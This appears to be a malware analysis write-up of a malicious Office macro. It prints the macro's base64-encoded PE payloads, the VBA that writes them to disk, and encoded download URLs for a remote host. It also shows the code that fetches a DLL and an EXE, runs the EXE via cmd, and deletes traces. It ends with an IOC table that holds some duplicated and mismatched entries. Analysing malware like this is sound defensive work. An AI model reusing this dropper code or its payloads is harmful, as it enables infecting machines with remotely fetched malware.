This function starts of with contructing lgstr which is a base64 encoded binary data. and then save temporary in `PUBLIC\` folder.

binary data or `lgstr` construction:

`sl1.tmp`


```
    lgstr = "T" & "V" & "qQA" & "AMAAAA"
    lgstr = lgstr & "EAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADdY4TFmQLqlpkC6paZAuqWRP0hlpoC6paZAuuWnQLqlmtb45ebAuqWa1vql5gC6pZrW+iXmALqllJpY2iZAuqW"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAEwBAwAxUuFdAAAAAAAAAADgAAIhCwEOAAACAAAABgAAAAAAAAAAAAAAEAAAACAAAAAAABAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAEAFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAsCAAAE0AAAC0IQAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAgAAAA"
    lgstr = lgstr & "cCAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAIAAAAAAEAAAAAIAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAA4AgAAACAAAAAEAAAABgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAIAAAAAAwAAAAAgAAAAoAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7FZoICAAEP8VDCAAEIvwhfZ0HGgsIAAQVv8VACAAEIXAdAX/dRD/0Fb/FQQgABBoRCAAEP8VDCAAEIvwhfZ0JWhQIAAQVv8VACAAEIXAdA5qAGoA/3UU/3UQagD/0Fb/FQQgABBeXcPMzMzMzMxVi+xqAP91FP8VCCAAEF3D"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "ACIAABIiAAAgIgAA8CEAAAAAAAAAAAAAAAAAAAAAAABXaW5pbmV0LmRsbABEZWxldGVVcmxDYWNoZUVudHJ5QQAAAABVcmxtb24uZGxsAABVUkxEb3dubG9hZFRvRmlsZUEAAAAAAAAAAAAAAAAAAAAAAAAxUuFdAAAAAA0AAAC0AAAAACEAAAAHAAAAAAAAMVLhXQAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMVLhXQAAAADsIAAA"
    lgstr = lgstr & "AQAAAAIAAAACAAAA2CAAAOAgAADoIAAAcBAAAAAQAAD1IAAA+SAAAAAAAQB1dGZjLmRsbABSQ1AAUkNUAAAAAEdDVEwAEAAAgAAAAC50ZXh0JG1uAAAAAAAgAAAUAAAALmlkYXRhJDUAAAAAICAAAIgAAAAucmRhdGEAALAgAABNAAAALmVkYXRhAAAAIQAAtAAAAC5yZGF0YSR6enpkYmcAAAC0IQAAFAAAAC5pZGF0YSQyAAAAAMghAAAUAAAA"
    lgstr = lgstr & "LmlkYXRhJDMAAAAA3CEAABQAAAAuaWRhdGEkNAAAAADwIQAASAAAAC5pZGF0YSQ2AAAAANwhAAAAAAAAAAAAACoiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIgAAEiIAACAiAADwIQAAAAAAAKUDTG9hZExpYnJhcnlBAACdAkdldFByb2NBZGRyZXNzAACeAUZyZWVMaWJyYXJ5AM4FV2luRXhlYwBLRVJORUwzMi5kbGwAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAgAAAABTALMBYwHTAtMDIwODBDMEowYzB6MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

`sl2.tmp`


```
    lgstr = "T" & "V" & "qQA" & "AMAAAA"
    lgstr = lgstr & "EAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADdY4TFmQLqlpkC6paZAuqWRP0hlpoC6paZAuuWnQLqlmtb45ebAuqWa1vql5gC6pZrW+iXmALqllJpY2iZAuqW"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGAwBgjOFdAAAAAAAAAADwACIgCwIOAAACAAAABgAAAAAAAAAAAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAKAhAABaAAAA/CEAACgAAAAAAAAAAAAAAAAwAAAMAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAIAgAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAC8AAAAABAAAAACAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAmAIAAAAgAAAABAAAAAYAAAAAAAAAAAAAAAAAAEAAAEAucGRhdGEAAAwAAAAAMAAA"
    lgstr = lgstr & "AAIAAAAKAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiJXCQISIl0JBBXSIPsMEiNDRoQAABJi/FJi/j/FfYPAABIi9hIhcB0I0iNFQ8QAABIi8j/FcYPAABIhcB0BUiLz//QSIvL/xW7DwAASI0NBBAAAP8Vvg8AAEiL2EiFwHQ0SI0V/w8AAEiLyP8Vjg8AAEiFwHQWRTPJSMdEJCAA"
    lgstr = lgstr & "AAAATIvGSIvXM8n/0EiLy/8Vcg8AAEiLXCRASIt0JEhIg8QwX8PMzMzMzMzMzMzMM9JJi8lI/yVUDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "YCIAAAAAAAByIgAAAAAAAIAiAAAAAAAAUCIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV2luaW5ldC5kbGwAAAAAAERlbGV0ZVVybENhY2hlRW50cnlBAAAAAFVybG1vbi5kbGwAAAAAAABVUkxEb3dubG9hZFRvRmlsZUEAAAAAAAAAAAAAYIzhXQAAAAANAAAA1AAAALggAAC4BgAAAAAAAGCM4V0AAAAADgAAAAAAAAAAAAAAAAAAAEdDVEwAEAAA"
    lgstr = lgstr & "vAAAAC50ZXh0JG1uAAAAAAAgAAAoAAAALmlkYXRhJDUAAAAAMCAAAIgAAAAucmRhdGEAALggAADUAAAALnJkYXRhJHp6emRiZwAAAIwhAAAQAAAALnhkYXRhAACgIQAAWgAAAC5lZGF0YQAA/CEAABQAAAAuaWRhdGEkMgAAAAAQIgAAFAAAAC5pZGF0YSQzAAAAACgiAAAoAAAALmlkYXRhJDQAAAAAUCIAAEgAAAAuaWRhdGEkNgAAAAAAMAAA"
    lgstr = lgstr & "DAAAAC5wZGF0YQAAAQ8GAA9kCQAPNAgAD1ILcAAAAAAAAAAAX4zhXQAAAADcIQAAAQAAAAIAAAACAAAAyCEAANAhAADYIQAAsBAAAAAQAADyIQAA9iEAAAAAAQBVcmxEb3dubG9hZFRvRmlsZS5kbGwAUkNQAFJDVAAAACgiAAAAAAAAAAAAAIoiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYCIAAAAAAAByIgAAAAAAAIAiAAAAAAAA"
    lgstr = lgstr & "UCIAAAAAAAAAAAAAAAAAAKgDTG9hZExpYnJhcnlBAACkAkdldFByb2NBZGRyZXNzAACkAUZyZWVMaWJyYXJ5AN4FV2luRXhlYwBLRVJORUwzMi5kbGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAACmEAAAjCEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

Code section to write the binary

```
FuEmdPath1 = Environ("PUBLIC") & "\sl1.tmp"
em.Text = lgstr
em.DataType = "bin.base64"
Stream.Type = 1
Stream.Open

Stream.Write em.NodeTypedValue
Stream.SaveToFile FuEmdPath1, 2
```

```
FuEmdPath2 = Environ("PUBLIC") & "\sl2.tmp"
em.Text = lgstr
em.DataType = "bin.base64"
Stream.Type = 1
Stream.Open
Stream.Write em.NodeTypedValue
Stream.SaveToFile FuEmdPath2, 2
```

To verify if it is an actual binary, the early sections of the string can be decoded and examine its header.

![Long String](/images/bubarparlimen/lgstr.png)


![Long String Header](/images/bubarparlimen/lgstr-header.png)


Byte `MZ` and `This program cannot be run in DOS mode.` indicates its a `PE` file.

The function then continue with fetching few files from a hosting server and save it into the computer


```
    Gud = MyDecode("aHR0cHM6Ly9hcm15YmFyLmhvcHRvLm9yZy9Mb2dpTWFpbC5kbGwJc34DSga")  'Dllurl

    Outp = Environ("LOCALAPPDATA") + MyDecode("XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWwuZGxs")
    retValue = CallWindowProc(pa, ByVal 1&, ByVal 2&, Gud, Outp)
```

The above section of code fetching a file from url `https://armybar[.]hopto.org/LogiMail[.]dll	` and then save into `\Microsoft\Office\LogiMail.dll`

```
    Gud = MyDecode("aHR0cHM6Ly9hcm15YmFyLmhvcHRvLm9yZy9Mb2dpTWFpbEFwcC5leGUJc34DSga") 'Exeurl


    Outp = Environ("LOCALAPPDATA") + MyDecode("XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWxBcHAuZXhl")
    retValue = CallWindowProc(pa, ByVal 1&, ByVal 2&, Gud, Outp)
    Embedded = "c" & "m" & "d" & " /c " & Outp
    retValue = CallWindowProc(pas, ByVal 1&, ByVal 2&, Gud, Embedded)
```

The above section of code does something similar but different file. First fetching a file from url `https://armybar[.]hopto.org/LogiMailApp[.]exe` then save it into `\Microsoft\Office\LogiMailApp.exe`.

```
Dim filesys
Set filesys = CreateObject("Scripting.FileSystemObject")
If filesys.FileExists(FuEmdPath1) Then
filesys.DeleteFile FuEmdPath1
End If
If filesys.FileExists(FuEmdPath2) Then
filesys.DeleteFile FuEmdPath2
End If
```

Then, this code shows that the function executes `cmd /c \Microsoft\Office\LogiMailApp.exe` 

```
Dim filesys
Set filesys = CreateObject("Scripting.FileSystemObject")
If filesys.FileExists(FuEmdPath1) Then
filesys.DeleteFile FuEmdPath1
End If
If filesys.FileExists(FuEmdPath2) Then
filesys.DeleteFile FuEmdPath2
End If
```

Lastly, the function ends by deleting the temporary file `sl1.tmp` and `sl2.tmp`
## 5. IOCs

| IOC                                          | Type                 |
| -------------------------------------------- | -------------------- |
| LogiMail.dll                                 | Executable File Name |
| `https://armybar[.]hopto.org/LogiMail[.]dll` | URL                  |
| LogiMail.exe                                 | Executable File Name |
| `https://armybar[.]hopto.org/LogiMail[.]dll` | URL                  |


